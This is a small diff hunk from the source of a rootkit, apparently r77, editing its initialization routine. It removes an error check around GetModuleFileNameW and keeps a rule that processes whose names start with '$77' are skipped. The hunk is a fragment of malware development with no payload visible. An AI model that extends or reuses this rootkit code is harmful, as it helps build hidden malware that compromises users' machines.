@@ -11,7 +11,7 @@ BOOL InitializeRootkit()
 {
 	// If the process starts with $77, do not load r77.
 	WCHAR executablePath[MAX_PATH + 1];
-	if (FAILED(GetModuleFileNameW(NULL, executablePath, MAX_PATH))) return FALSE;
+	GetModuleFileNameW(NULL, executablePath, MAX_PATH);
 	if (HasPrefix(PathFindFileNameW(executablePath))) return FALSE;
 
 	// Write the r77 header.
